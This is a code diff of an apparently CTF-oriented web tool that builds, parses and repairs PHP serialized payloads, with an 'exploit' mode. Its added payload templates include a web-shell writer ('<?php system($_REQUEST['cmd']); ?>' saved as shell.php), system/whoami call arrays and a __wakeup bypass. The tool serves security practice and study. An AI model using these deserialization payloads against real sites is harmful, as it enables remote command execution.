     function fixSerializedLengths(input) {
-      let text = realNulls(input);
-      // 使用 [^"\\0] 而不是 [^"\\]，因为 realNulls 已将 \0 转为真正的 null 字节
-      // null 字符 (\0) 是字符串的分隔符，不应被匹配
-      text = text.replace(/O:\d+:"((?:\\.|[^"\\0])*)":/g, (match, className) => {
-        return `O:${byteLen(className)}:"${className}":`;
-      });
-      text = text.replace(/s:\d+:"((?:\\.|[^"\\0])*)";/g, (match, content) => {
-        return phpString(content);
-      });
-      return text;
+      const text = realNulls(input);
+      const patches = [];
+      try {
+        const repair = chooseSerializedRepair(text);
+        if (repair && repair.patches.length > 0) {
+          return applyTextPatches(text, repair.patches);
+        }
+        skipSerializedValueAt(text, 0, (node) => {
+          if (node.type === "string") {
+            patches.push({
+              start: node.byteLenStart,
+              end: node.byteLenEnd,
+              value: String(rawByteLen(node.displayValue))
+            });
+          }
+          if (node.type === "object") {
+            patches.push({
+              start: node.classLenStart,
+              end: node.classLenEnd,
+              value: String(rawByteLen(node.classDisplayName))
+            });
+          }
+        });
+        return applyTextPatches(text, patches);
+      } catch (error) {
+        return fallbackFixSerializedLengths(text);
+      }
     }
 
     function codePointByteLen(codePoint) {
@@ -1713,38 +2846,26 @@
       }
 
       readByteString(length) {
-        const start = this.pos;
-        let bytes = 0;
-        while (this.pos < this.text.length && bytes < length) {
-          const codePoint = this.text.codePointAt(this.pos);
-          const size = codePointByteLen(codePoint);
-          if (bytes + size > length) {
-            this.error("字符串字节长度落在半个字符上");
-          }
-          bytes += size;
-          this.pos += codePoint > 0xFFFF ? 2 : 1;
+        try {
+          const result = readRawUtf8Bytes(this.text, this.pos, length);
+          this.pos = result.end;
+          return result.value;
+        } catch (error) {
+          this.error(error.message);
         }
-        if (bytes !== length) this.error(`字符串长度不足，期望 ${length} 字节`);
-        return this.text.slice(start, this.pos);
       }
 
       readQuotedByteString(afterQuote) {
         const length = this.readInteger(":");
         this.consume('"');
-        const start = this.pos;
-        // 严格按字节数读取（正确处理转义）
-        let bytes = 0;
-        while (this.pos < this.text.length && bytes < length) {
-          const ch = this.text[this.pos];
-          if (ch === '\\' && this.pos + 1 < this.text.length) {
-            this.pos += 2; bytes += 1;
-          } else if (ch.charCodeAt(0) === 0) {
-            this.pos += 1; bytes += 1;
-          } else {
-            this.pos += 1; bytes += 1;
-          }
+        let value = "";
+        try {
+          const result = readRawUtf8Bytes(this.text, this.pos, length);
+          value = result.value;
+          this.pos = result.end;
+        } catch (error) {
+          this.error(error.message);
         }
-        const value = this.text.slice(start, this.pos);
         // 严格检查闭合
         this.consume('"');
         this.consume(afterQuote);
@@ -1820,30 +2941,58 @@
       }
     }
 
-    function parseSerialized(input) {
+    function parseSerialized(input, options = {}) {
       const reader = new SerializedReader(input);
       const value = reader.readValue();
       reader.skipSpace();
-      if (reader.pos < reader.text.length) reader.error("后面还有未解析内容");
+      const allowTrailing = options.allowTrailing !== false;
+      if (!allowTrailing && reader.pos < reader.text.length) reader.error("后面还有未解析内容");
+      value.trailing = reader.text.slice(reader.pos);
       return value;
     }
 
-    function quoteHumanString(value) {
+    function parseSerializedRepairAware(input) {
+      const text = realNulls(input);
+      const repair = chooseSerializedRepair(text);
+      let parsed = null;
+      let parseError = null;
+      try {
+        parsed = parseSerialized(text);
+      } catch (error) {
+        parseError = error;
+      }
+
+      if (repair) {
+        const fixed = applyTextPatches(text, repair.patches || []);
+        const trailingLength = parsed ? parsed.trailing.trim().length : Number.POSITIVE_INFINITY;
+        if (!parsed || (repair.trailingLength < trailingLength && fixed !== text)) {
+          const repaired = parseSerialized(fixed, { allowTrailing: false });
+          repaired.repairedFrom = text;
+          return repaired;
+        }
+      }
+
+      if (parsed) return parsed;
+      throw parseError || new Error("无法解析序列化内容");
+    }
+
+    function quoteHumanString(value, options = {}) {
+      const newlineToken = options.realNewlines ? "\n" : "\\n";
       return `"${value
         .replaceAll("\\", "\\\\")
         .replaceAll("\u0000", "\\0")
         .replaceAll("\r", "\\r")
-        .replaceAll("\n", "\\n")
+        .replaceAll("\n", newlineToken)
         .replaceAll("\t", "\\t")
         .replaceAll('"', '\\"')}"`;
     }
 
-    function formatSerializedKey(node) {
-      if (node.type === "string") return quoteHumanString(node.value);
+    function formatSerializedKey(node, options = {}) {
+      if (node.type === "string") return quoteHumanString(node.value, options);
       if (node.type === "int" || node.type === "float") return String(node.value);
       if (node.type === "bool") return node.value ? "true" : "false";
       if (node.type === "null") return "null";
-      return formatSerializedValue(node);
+      return formatSerializedValue(node, 0, options);
     }
 
     function propertyLabel(keyNode, currentClass) {
@@ -1863,11 +3012,11 @@
       return `public ${raw}`;
     }
 
-    function formatSerializedValue(node, level = 0) {
+    function formatSerializedValue(node, level = 0, options = {}) {
       const pad = "  ".repeat(level);
       const childPad = "  ".repeat(level + 1);
 
-      if (node.type === "string") return quoteHumanString(node.value);
+      if (node.type === "string") return quoteHumanString(node.value, options);
       if (node.type === "int" || node.type === "float") return String(node.value);
       if (node.type === "bool") return node.value ? "true" : "false";
       if (node.type === "null") return "null";
@@ -1876,7 +3025,7 @@
       if (node.type === "array") {
         if (node.items.length === 0) return "[]";
         const lines = node.items.map((item) => {
-          return `${childPad}${formatSerializedKey(item.key)} => ${formatSerializedValue(item.value, level + 1)}`;
+          return `${childPad}${formatSerializedKey(item.key, options)} => ${formatSerializedValue(item.value, level + 1, options)}`;
         });
         return `[\n${lines.join(",\n")}\n${pad}]`;
       }
@@ -1884,7 +3033,7 @@
       if (node.type === "object") {
         if (node.props.length === 0) return `${node.className} {}`;
         const lines = node.props.map((prop) => {
-          return `${childPad}${propertyLabel(prop.key, node.className)} = ${formatSerializedValue(prop.value, level + 1)};`;
+          return `${childPad}${propertyLabel(prop.key, node.className)} = ${formatSerializedValue(prop.value, level + 1, options)};`;
         });
         return `${node.className} {\n${lines.join("\n")}\n${pad}}`;
       }
@@ -1978,23 +3127,26 @@
       }
     }
 
+    const queryPanel = $(".query-panel");
+    const rightStack = $(".right-stack");
+    if (queryPanel && rightStack && queryPanel.parentElement !== rightStack) {
+      rightStack.appendChild(queryPanel);
+    }
+
+    function activateMode(mode) {
+      const targetButton = $(`.tab[data-mode="${mode}"]`);
+      const targetPanel = $(`#mode-${mode}`);
+      if (!targetButton || !targetPanel) return;
+      $$(".tab").forEach((tab) => tab.classList.remove("active"));
+      $$(".mode-panel").forEach((panel) => panel.classList.add("hidden"));
+      targetButton.classList.add("active");
+      targetPanel.classList.remove("hidden");
+      $(".grid")?.classList.toggle("mode-exploit-active", mode === "exploit");
+    }
+
     $$(".tab").forEach((button) => {
       button.addEventListener("click", () => {
-        $$(".tab").forEach((tab) => tab.classList.remove("active"));
-        $$(".mode-panel").forEach((panel) => panel.classList.add("hidden"));
-        button.classList.add("active");
-        $(`#mode-${button.dataset.mode}`).classList.remove("hidden");
-        // 实战tab时把URL查询参数移到右边，其他tab时放左边
-        const queryPanel = $(".panel:has(#query-param-list)");
-        const rightStack = $(".right-stack");
-        const leftStack = $(".left-stack");
-        if (queryPanel && rightStack && leftStack) {
-          if (button.dataset.mode === "exploit") {
-            rightStack.appendChild(queryPanel);
-          } else {
-            leftStack.appendChild(queryPanel);
-          }
-        }
+        activateMode(button.dataset.mode);
       });
     });
 
@@ -2018,6 +3170,18 @@
       setConstructOutput(phpString("system"));
     });
 
+    $$(".quick-btn[data-single-demo]").forEach((button) => {
+      button.addEventListener("click", () => {
+        const raw = button.dataset.singleDemo || "";
+        const splitAt = raw.indexOf(":");
+        const type = splitAt >= 0 ? raw.slice(0, splitAt) : raw;
+        const value = splitAt >= 0 ? raw.slice(splitAt + 1) : "";
+        $("#single-type").value = type;
+        $("#single-value").value = value;
+        setConstructOutput(phpValue(type, value));
+      });
+    });
+
     $("#add-array-item").addEventListener("click", () => {
       $("#array-items").appendChild(makeValueControls("key", false));
     });
@@ -2030,6 +3194,47 @@
       const serialized = "a:" + rows.length + ":{" + body + "}";
       addQueryParamRow("NeedEdit", serialized);
       if (activeOutput !== "query") switchOutput("query");
+    });
+
+    function fillRows(container, rows, isObject) {
+      container.innerHTML = "";
+      rows.forEach((item) => {
+        const row = makeValueControls(item.key || "key", isObject);
+        if (isObject && item.scope) row.querySelector('[data-field="scope"]').value = item.scope;
+        if (!isObject && item.keyType) row.querySelector('[data-field="key-type"]').value = item.keyType;
+        row.querySelector('[data-field="value-type"]').value = item.valueType || "string";
+        row.querySelector('[data-field="value"]').value = item.value ?? "";
+        container.appendChild(row);
+      });
+    }
+
+    $("#load-array-login").addEventListener("click", () => {
+      fillRows($("#array-items"), [
+        { key: "user", keyType: "string", valueType: "string", value: "admin" },
+        { key: "pass", keyType: "string", valueType: "string", value: "123456" },
+        { key: "remember", keyType: "string", valueType: "bool", value: "true" }
+      ], false);
+      buildArray();
+    });
+
+    $("#load-array-call").addEventListener("click", () => {
+      fillRows($("#array-items"), [
+        { key: "0", keyType: "int", valueType: "string", value: "system" },
+        { key: "1", keyType: "int", valueType: "string", value: "whoami" },
+        { key: "2", keyType: "int", valueType: "empty_array", value: "" }
+      ], false);
+      buildArray();
+    });
+
+    $("#load-array-mixed").addEventListener("click", () => {
+      fillRows($("#array-items"), [
+        { key: "name", keyType: "string", valueType: "string", value: "admin" },
+        { key: "id", keyType: "string", valueType: "int", value: "1" },
+        { key: "score", keyType: "string", valueType: "float", value: "3.14" },
+        { key: "enabled", keyType: "string", valueType: "bool", value: "true" },
+        { key: "meta", keyType: "string", valueType: "serialized", value: 'a:1:{s:3:"cmd";s:6:"whoami";}' }
+      ], false);
+      buildArray();
     });
 
     $("#add-object-item").addEventListener("click", () => {
@@ -2048,6 +3253,35 @@
       const serialized = "O:" + byteLen(className) + ":\"" + className + "\":" + rows.length + ":{" + body + "}";
       addQueryParamRow("NeedEdit", serialized);
       if (activeOutput !== "query") switchOutput("query");
+    });
+
+    $("#load-object-public").addEventListener("click", () => {
+      $("#class-name").value = "User";
+      fillRows($("#object-items"), [
+        { scope: "public", key: "name", valueType: "string", value: "admin" },
+        { scope: "public", key: "cmd", valueType: "string", value: "whoami" },
+        { scope: "public", key: "id", valueType: "int", value: "1" }
+      ], true);
+      buildObject();
+    });
+
+    $("#load-object-visibility").addEventListener("click", () => {
+      $("#class-name").value = "User";
+      fillRows($("#object-items"), [
+        { scope: "private", key: "secret", valueType: "string", value: "flag.php" },
+        { scope: "protected", key: "cmd", valueType: "string", value: "id" },
+        { scope: "public", key: "debug", valueType: "bool", value: "true" }
+      ], true);
+      buildObject();
+    });
+
+    $("#load-object-raw").addEventListener("click", () => {
+      $("#class-name").value = "User";
+      fillRows($("#object-items"), [
+        { scope: "public", key: "profile", valueType: "serialized", value: 'O:7:"Profile":1:{s:4:"role";s:5:"admin";}' },
+        { scope: "public", key: "args", valueType: "serialized", value: 'a:2:{i:0;s:6:"system";i:1;s:6:"whoami";}' }
+      ], true);
+      buildObject();
     });
 
     // 一键序列化：支持 class、对象字面量、嵌套对象、嵌套数组
@@ -2541,181 +3775,194 @@
 
     $("#parse-serialized").addEventListener("click", () => {
       try {
-        const parsed = parseSerialized($("#manual-input").value);
-        setConstructOutput(formatSerializedValue(parsed));
+        const parsed = parseSerializedRepairAware($("#manual-input").value);
+        setConstructOutput(formatSerializedValue(parsed, 0, { realNewlines: true }), { preserveNewlines: true });
       } catch (error) {
         alert(`反向解析失败：${error.message}`);
       }
     });
 
-    function parsedObjectToPhpClass(node, collected) {
-      if (node.type !== "object") return null;
-      collected = collected || [];
-      let php = `class ${node.className}{\n`;
-      node.props.forEach((prop) => {
-        const keyNode = prop.key;
-        let visibility = "public";
-        let propName = keyNode.value;
-        if (keyNode.type === "string") {
-          const raw = keyNode.value;
-          if (raw.startsWith("\0*\0")) {
-            visibility = "protected";
-            propName = raw.slice(3);
-          } else if (raw.startsWith("\0")) {
-            visibility = "private";
-            const classEnd = raw.indexOf("\0", 1);
-            if (classEnd > 0) propName = raw.slice(classEnd + 1);
-          }
-        }
-        let valueStr = "";
-        if (prop.value.type === "string") {
-          valueStr = `"${prop.value.value.replace(/\\/g, "\\\\").replace(/"/g, '\\"')}"`;
-        } else if (prop.value.type === "int" || prop.value.type === "float") {
-          valueStr = String(prop.value.value);
-        } else if (prop.value.type === "bool") {
-          valueStr = prop.value.value ? "true" : "false";
-        } else if (prop.value.type === "null") {
-          valueStr = "null";
-        } else if (prop.value.type === "object") {
-          const nestedClass = parsedObjectToPhpClass(prop.value, collected);
-          if (nestedClass) {
-            collected.push(nestedClass);
-            valueStr = `new ${prop.value.className}()`;
-          } else {
-            valueStr = "null";
-          }
-        } else if (prop.value.type === "array") {
-          const arrItems = prop.value.items.map((item) => {
-            const k = item.key.type === "string"
-              ? `"${item.key.value.replace(/\\/g, "\\\\").replace(/"/g, '\\"')}"`
-              : String(item.key.value ?? 0);
-            if (item.value.type === "string") {
-              return `${k} => "${item.value.value.replace(/\\/g, "\\\\").replace(/"/g, '\\"')}"`;
-            }
-            if (item.value.type === "int" || item.value.type === "float") {
-              return `${k} => ${item.value.value}`;
-            }
-            if (item.value.type === "bool") {
-              return `${k} => ${item.value.value ? "true" : "false"}`;
-            }
-            if (item.value.type === "null") {
-              return `${k} => null`;
-            }
-            return `${k} => ${formatSerializedValue(item.value)}`;
-          });
-          valueStr = `[${arrItems.join(", ")}]`;
-        } else {
-          valueStr = formatSerializedValue(prop.value);
-        }
-        php += `    ${visibility} $${propName} = ${valueStr};\n`;
-      });
-      php += "}";
-      collected.unshift(php);
-      return collected;
+    function quotePhpCodeString(value) {
+      return `"${String(value ?? "")
+        .replaceAll("\\", "\\\\")
+        .replaceAll("\0", "\\0")
+        .replaceAll("\r", "\\r")
+        .replaceAll("\n", "\\n")
+        .replaceAll("\t", "\\t")
+        .replaceAll('"', '\\"')}"`;
     }
 
-    $("#copy-as-php-class").addEventListener("click", async () => {
+    function getPhpPropInfo(prop, currentClass) {
+      if (Object.prototype.hasOwnProperty.call(prop, "name")) {
+        return {
+          visibility: prop.visibility || "public",
+          name: prop.name || "prop",
+          value: prop.value
+        };
+      }
+
+      let visibility = "public";
+      let propName = "prop";
+      const keyNode = prop.key;
+      if (keyNode?.type === "string") {
+        const raw = keyNode.value;
+        propName = raw;
+        if (raw.startsWith("\0*\0")) {
+          visibility = "protected";
+          propName = raw.slice(3);
+        } else if (raw.startsWith("\0")) {
+          visibility = "private";
+          const classEnd = raw.indexOf("\0", 1);
+          if (classEnd > 0) propName = raw.slice(classEnd + 1);
+        }
+      }
+
+      return {
+        visibility,
+        name: propName || "prop",
+        value: prop.value
+      };
+    }
+
+    function formatPhpArrayValue(node, nestedObjects, depth = 0) {
+      if (!node.items || node.items.length === 0) return "[]";
+      const items = node.items.map((item) => {
+        const key = item.key?.type === "auto-index"
+          ? null
+          : formatPhpValueForClass(item.key, nestedObjects, depth + 1);
+        const value = formatPhpValueForClass(item.value, nestedObjects, depth + 1);
+        return key === null ? value : `${key} => ${value}`;
+      });
+      return `[${items.join(", ")}]`;
+    }
+
+    function formatPhpValueForClass(node, nestedObjects, depth = 0) {
+      if (!node) return "null";
+      if (node.type === "string") return quotePhpCodeString(node.value);
+      if (node.type === "int" || node.type === "float") return String(node.value);
+      if (node.type === "bool") return node.value ? "true" : "false";
+      if (node.type === "null") return "null";
+      if (node.type === "reference") return `/* ${node.value ? `R:${node.value}` : "reference"} */ null`;
+      if (node.type === "array") return formatPhpArrayValue(node, nestedObjects, depth);
+      if (node.type === "object") {
+        nestedObjects.push(node);
+        return `new ${node.className}()`;
+      }
+      return quotePhpCodeString(node.value ?? "");
+    }
+
+    function parsedObjectToPhpClass(node) {
+      if (!node || node.type !== "object") return null;
+      const classes = [];
+
+      function appendClass(objectNode) {
+        const nestedObjects = [];
+        const lines = [`class ${objectNode.className}{`];
+        (objectNode.props || []).forEach((prop) => {
+          const info = getPhpPropInfo(prop, objectNode.className);
+          const valueStr = formatPhpValueForClass(info.value, nestedObjects);
+          lines.push(`    ${info.visibility} $${info.name} = ${valueStr};`);
+        });
+        lines.push("}");
+        classes.push(lines.join("\n"));
+        nestedObjects.forEach(appendClass);
+      }
+
+      appendClass(node);
+      return classes;
+    }
+
+    function formatNestedPhpValue(node) {
+      if (!node) return "null";
+      if (node.type === "string") return quotePhpCodeString(node.value);
+      if (node.type === "int" || node.type === "float") return String(node.value);
+      if (node.type === "bool") return node.value ? "true" : "false";
+      if (node.type === "null") return "null";
+      if (node.type === "reference") return `/* ${node.value ? `R:${node.value}` : "reference"} */ null`;
+      if (node.type === "array") return formatPhpArrayValue(node, []);
+      return quotePhpCodeString(node.value ?? "");
+    }
+
+    function pseudoToPhp(node) {
+      if (!node || node.type !== "object") return "";
+      const lines = [`class ${node.className}{`];
+
+      function appendProperty(prop, ownerClass, level) {
+        const info = getPhpPropInfo(prop, ownerClass);
+        const pad = "    ".repeat(level);
+        if (info.value?.type === "object") {
+          lines.push(`${pad}${info.visibility} $${info.name} = ${info.value.className} {`);
+          (info.value.props || []).forEach((child) => appendProperty(child, info.value.className, level + 1));
+          lines.push(`${pad}};`);
+          return;
+        }
+        lines.push(`${pad}${info.visibility} $${info.name} = ${formatNestedPhpValue(info.value)};`);
+      }
+
+      (node.props || []).forEach((prop) => appendProperty(prop, node.className, 1));
+      lines.push("}");
+      return lines.join("\n");
+    }
+
+    function parseObjectFromOutputText(input) {
+      const text = String(input ?? "").trim();
+      if (!text) throw new Error("输出区为空，请先生成或粘贴内容到输出区");
+
+      let serializedError = "";
       try {
-        const parsed = parseSerialized($("#manual-input").value);
+        const parsed = parseSerializedRepairAware(text);
+        if (parsed.type === "object") return parsed;
+        throw new Error("当前内容不是对象结构");
+      } catch (error) {
+        serializedError = error.message;
+      }
+
+      try {
+        const parser = new PhpLiteralParser(text, { oldSyntaxEnabled: true });
+        const parsed = parser.parseTopLevel();
+        parser.skipWhitespace();
+        if (parser.pos < parser.text.length) {
+          const rest = parser.text.slice(parser.pos).trim();
+          if (rest) throw new Error(`存在未解析内容：${rest.slice(0, 40)}`);
+        }
+        if (parsed.type === "object") return parsed;
+        throw new Error("当前内容不是对象结构");
+      } catch (error) {
+        throw new Error(`${error.message || "伪代码解析失败"}；序列化解析提示：${serializedError}`);
+      }
+    }
+
+    function replaceCurrentOutput(value) {
+      setOutput(value, activeOutput, { preserveNewlines: true });
+      $("#output").focus();
+    }
+
+    $("#copy-as-php-class").addEventListener("click", () => {
+      try {
+        const parsed = parseObjectFromOutputText($("#output").value);
         const result = parsedObjectToPhpClass(parsed);
         if (!result) {
           alert("只能将对象类型转换为PHP类代码");
           return;
         }
-        const phpCode = Array.isArray(result) ? result.join("\n\n") : result;
-        await copyText(phpCode, "#manual-input");
+        replaceCurrentOutput(result.join("\n\n"));
       } catch (error) {
         alert(`转换失败：${error.message}`);
       }
     });
 
-    // 伪代码 → PHP类（保留嵌套对象结构）
-    function pseudoToPhp(str) {
-      const lines = str.split('\n');
-      const classes = [];
-      let currentClass = null;
-      let indent = 0;
-
-      for (const line of lines) {
-        const trimmed = line.trim();
-        if (!trimmed || trimmed.startsWith('//')) continue;
-
-        // class ClassName { 或 ClassName {
-        const classMatch = trimmed.match(/^(?:class\s+)?(\w+)\s*\{?\s*$/);
-        if (classMatch && !trimmed.includes('=')) {
-          if (currentClass) classes.push(currentClass);
-          currentClass = { name: classMatch[1], props: [] };
-          indent = line.search(/\S/);
-          continue;
-        }
-
-        // public $prop = value; 或 public $prop = new ClassName();
-        const propMatch = trimmed.match(/^(?:public|protected|private|var)?\s*\$?(\w+)\s*=\s*(.+);?\s*$/);
-        if (propMatch && currentClass) {
-          let visibility = 'public';
-          if (trimmed.startsWith('protected')) visibility = 'protected';
-          else if (trimmed.startsWith('private')) visibility = 'private';
-
-          let value = propMatch[2].trim();
-          // 检查值是否是嵌套对象（以类名开头后跟 {）
-          const nestedMatch = value.match(/^(\w+)\s*\{/);
-          if (nestedMatch) {
-            // 递归处理嵌套对象
-            const nestedName = nestedMatch[1];
-            // 找到对应的嵌套代码块
-            value = `new ${nestedName}()`;
-          }
-          currentClass.props.push({ visibility, name: propMatch[1], value });
-        }
-
-        // } 关闭类
-        if (trimmed === '}') {
-          if (currentClass) {
-            classes.push(currentClass);
-            currentClass = null;
-          }
-        }
-      }
-      if (currentClass) classes.push(currentClass);
-
-      // 生成PHP代码
-      return classes.map(cls => {
-        let php = `class ${cls.name}{\n`;
-        cls.props.forEach(p => {
-          php += `    ${p.visibility} $${p.name} = ${p.value};\n`;
-        });
-        php += '}';
-        return php;
-      }).join('\n\n');
-    }
-
-    $("#pseudo-to-php").addEventListener("click", async () => {
-      const input = $("#manual-input").value;
-      if (!input.trim()) { alert("请先粘贴伪代码或序列化串"); return; }
-
-      // 先尝试作为序列化串解析
+    $("#pseudo-to-php").addEventListener("click", () => {
       try {
-        const parsed = parseSerialized(input);
-        if (parsed.type === "object") {
-          const result = parsedObjectToPhpClass(parsed);
-          if (result) {
-            const phpCode = Array.isArray(result) ? result.join("\n\n") : result;
-            await copyText(phpCode, "#manual-input");
-            return;
-          }
-        }
-      } catch (e) {}
-
-      // 尝试作为伪代码解析
-      try {
-        const phpCode = pseudoToPhp(input);
-        if (phpCode) {
-          await copyText(phpCode, "#manual-input");
+        const parsed = parseObjectFromOutputText($("#output").value);
+        const phpCode = pseudoToPhp(parsed);
+        if (!phpCode) {
+          alert("无法解析输出区内容");
           return;
         }
-      } catch (e) {}
-
-      alert("无法解析输入内容");
+        replaceCurrentOutput(phpCode);
+      } catch (error) {
+        alert(`转换失败：${error.message}`);
+      }
     });
 
     $("#decode-url-input").addEventListener("click", () => {
@@ -2902,8 +4149,89 @@
       updateStats();
     });
 
+    const templatePayloads = {
+      "php-public-basic": `class User{
+    public $name = "admin";
+    public $cmd = "whoami";
+    public $enabled = true;
+}`,
+      "php-visibility": `class User{
+    private $secret = "flag.php";
+    protected $cmd = "id";
+    var $legacy = "old-public";
+}`,
+      "php-nested": `class User{
+    public $profile = Profile {
+        public $role = Role {
+            public $name = "admin";
+            public $level = 10;
+        };
+        public $path = "/var/www/html";
+    };
+    public $cmd = "whoami";
+}`,
+      "php-recursive": `class Node{
+    public $name = "root";
+    public $child = NodeChild {
+        public $name = "child";
+        public $parent = null;
+    };
+    public $self = null;
+}`,
+      "php-array-mixed": `class RequestBag{
+    public $params = [
+        "cmd" => "whoami",
+        "uid" => 1,
+        "debug" => true,
+        "rate" => 3.14,
+        "empty" => null,
+        "profile" => Profile {
+            public $role = "admin";
+        }
+    ];
+}`,
+      "php-destruct": `class FileWriter{
+    public $filename = "shell.php";
+    public $content = "<?php system($_REQUEST['cmd']); ?>";
+    public $append = false;
+}`,
+      "php-wakeup": `class WakeupBypass{
+    public $cmd = "whoami";
+    public $token = "NeedEdit";
+}`,
+      "php-tostring": `class EchoChain{
+    public $source = Reader {
+        public $file = "flag.php";
+    };
+    public $prefix = "result:";
+}`,
+      "ser-object-basic": `O:4:"User":1:{s:4:"name";s:5:"admin";}`,
+      "ser-array-assoc": `a:2:{s:4:"user";s:5:"admin";s:4:"pass";s:6:"123456";}`,
+      "ser-private": `O:4:"User":1:{s:10:"\\0User\\0cmd";s:6:"whoami";}`,
+      "ser-protected": `O:4:"User":1:{s:6:"\\0*\\0cmd";s:2:"id";}`,
+      "ser-nested-object": `O:4:"User":2:{s:7:"profile";O:7:"Profile":2:{s:4:"role";s:5:"admin";s:5:"level";i:10;}s:3:"cmd";s:6:"whoami";}`,
+      "ser-array-object": `a:2:{s:4:"user";O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"uid";i:1;}s:4:"args";a:2:{i:0;s:6:"system";i:1;s:6:"whoami";}}`,
+      "ser-reference": `O:4:"User":2:{s:3:"cmd";s:6:"whoami";s:5:"again";R:2;}`,
+      "ser-wakeup-bypass": `O:12:"WakeupBypass":3:{s:3:"cmd";s:6:"whoami";s:5:"token";s:8:"NeedEdit";}`,
+      "ser-newline": "O:4:\"Note\":1:{s:4:\"text\";s:11:\"hello\nworld\";}",
+      "ser-escape-close": `O:4:"Demo":3:{s:1:"a";s:5:"Hello";s:1:"b";s:3:"CTF";s:3:"key";s:20:"GET_FLAG";}FAKE_FLAG";}`,
+      "ser-stdclass": `O:8:"stdClass":2:{s:4:"name";s:5:"admin";s:3:"uid";i:1;}`,
+      "ser-deep-array": `a:2:{s:4:"meta";a:2:{s:4:"user";s:5:"admin";s:5:"flags";a:3:{i:0;s:4:"read";i:1;s:5:"write";i:2;s:5:"debug";}}s:4:"call";a:2:{i:0;s:6:"system";i:1;s:2:"id";}}`
+    };
+
     $$(".template-btn").forEach((button) => {
-      button.addEventListener("click", () => setConstructOutput(realNulls(button.dataset.template)));
+      button.addEventListener("click", () => {
+        const value = templatePayloads[button.dataset.templateId] || "";
+        if (!value) return;
+        if (button.dataset.templateKind === "php") {
+          $("#php-class-input").value = value;
+          activateMode("oneclick");
+          return;
+        }
+        const payload = realNulls(value);
+        $("#manual-input").value = visibleNulls(payload);
+        setConstructOutput(payload);
+      });
     });
 
     const arrayDefaults = [
@@ -2929,7 +4257,7 @@
 
     function applyTheme(theme) {
       document.documentElement.dataset.theme = theme;
-      themeToggle.textContent = theme === "dark" ? "☀️" : "🌙";
+      themeToggle.textContent = theme === "dark" ? "\u2600\uFE0F" : "\uD83C\uDF19";
       localStorage.setItem("theme", theme);
     }
 
@@ -2948,25 +4276,30 @@
     let countEditorOriginals = [];
 
     function scanObjectCounts(payload) {
-      // 匹配 O:字节数:"类名":属性数:
-      // 精确记录每个属性计数在字符串中的起止位置
-      const regex = /O:(\d+):"([^"]+)":(\d+):/g;
+      const text = realNulls(payload);
+      const repaired = chooseSerializedRepair(text);
+      if (repaired && repaired.objects.length > 0) {
+        return repaired.objects.map((item) => ({
+          ...item,
+          fullMatch: item.fullMatch || `O:${item.byteCount}:"${item.className}":${item.propCount}:`
+        }));
+      }
+
       const results = [];
-      let m;
-      while ((m = regex.exec(payload)) !== null) {
-        // propCountStart = m.index + m[0].length - 1 - m[3].length
-        // m[0] = O:N:"ClassName":PropCount:
-        // 最后一个 : 前面就是 PropCount 数字
-        const propCountEnd = m.index + m[0].length - 1; // : 之前
-        const propCountStart = propCountEnd - m[3].length;
-        results.push({
-          fullMatch: m[0],
-          byteCount: parseInt(m[1], 10),
-          className: m[2],
-          propCount: parseInt(m[3], 10),
-          propCountStart,
-          propCountEnd
+      try {
+        skipSerializedValueAt(text, 0, (node) => {
+          if (node.type !== "object") return;
+          results.push({
+            fullMatch: text.slice(node.start, node.headerEnd),
+            byteCount: node.classLen,
+            className: node.className,
+            propCount: node.propCount,
+            propCountStart: node.propCountStart,
+            propCountEnd: node.propCountEnd
+          });
         });
+      } catch (error) {
+        return [];
       }
       return results;
     }
@@ -2990,15 +4323,16 @@
       countEditorOriginals = objs.map(o => o.propCount);
       objs.forEach((obj, idx) => {
         const row = document.createElement("div");
+        const classLabel = `O:${obj.byteCount}:"${obj.className}"`;
         row.className = "count-row";
         row.innerHTML =
-          `<span class="count-class" title="O:${obj.byteCount}:&quot;${obj.className}&quot;:${obj.propCount}:">O:${obj.byteCount}:"${obj.className}"</span>` +
+          `<span class="count-class" title="${escapeHtml(`${classLabel}:${obj.propCount}:`)}">${escapeHtml(classLabel)}</span>` +
           `<span class="count-arrow">→ 属性数</span>` +
           `<input class="count-input" type="number" min="0" max="999" value="${obj.propCount}" data-idx="${idx}">` +
           `<div style="display:flex;gap:4px;">` +
-          `<button class="count-btn" data-action="dec" data-idx="${idx}" title="-1">−</button>` +
+          `<button class="count-btn" data-action="dec" data-idx="${idx}" title="-1">&minus;</button>` +
           `<button class="count-btn" data-action="inc" data-idx="${idx}" title="+1">+</button>` +
-          `<button class="count-btn" data-action="reset" data-idx="${idx}" title="重置为初始值" style="font-size:12px;width:auto;padding:0 6px;">↺</button>` +
+          `<button class="count-btn" data-action="reset" data-idx="${idx}" title="重置为初始值" style="font-size:12px;width:auto;padding:0 6px;">&#8634;</button>` +
           `</div>`;
         container.appendChild(row);
       });
@@ -3164,153 +4498,9 @@
       copyText(escapeLastAfter, "#escape-source");
     });
 
-    // --- 替换对比：自动解析属性变化 ---
-    function normalizeEscapes(str) {
-      // 将用户输入的转义序列还原为真实字节
-      // 优先处理 \\0 (已转义的) → \0 (显示格式)，然后再处理 \0 → 真实 null
-      return str.replace(/\\\\0/g, '\x00')
-                .replace(/\\0/g, '\x00')
-                .replace(/\\n/g, '\n')
-                .replace(/\\t/g, '\t')
-                .replace(/\\r/g, '\r')
-                .replace(/\\"/g, '"')
-                .replace(/\\\\/g, '\\');
-    }
-
-    function readSerializedString(str, startPos) {
-      // 从 startPos 开始读取 s:N:"..."; 返回 { value, endPos, valueBytes }
-      // 按 PHP 字节规则处理转义: \0=1字节, \\=1字节, \n=1字节, 真实null=1字节, 其他=1字节
-      const m = str.slice(startPos).match(/^s:(\d+):"/);
-      if (!m) return null;
-      const valueBytes = parseInt(m[1], 10);
-      const contentStart = startPos + m[0].length;
-      let pos = contentStart;
-      let bytesRead = 0;
-      while (pos < str.length && bytesRead < valueBytes) {
-        const ch = str[pos];
-        if (ch === '\\' && pos + 1 < str.length) {
-          // 转义序列: \0, \n, \\, \", 等 — PHP 按 1 字节计
-          pos += 2; bytesRead += 1;
-        } else if (ch.charCodeAt(0) === 0) {
-          // 真实 null 字节
-          pos += 1; bytesRead += 1;
-        } else {
-          pos += 1; bytesRead += 1;
-        }
-      }
-      const rawValue = str.slice(contentStart, pos);
-      // 将显示格式 \0 还原为真实 null 字节
-      const value = rawValue.replace(/\\0/g, '\0');
-      // 跳过 ";
-      if (str[pos] === '"' && str[pos + 1] === ';') pos += 2;
-      return { value, endPos: pos, valueBytes };
-    }
-
-    function skipSerializedValue(str, startPos) {
-      const type = str[startPos];
-      if (type === 's') {
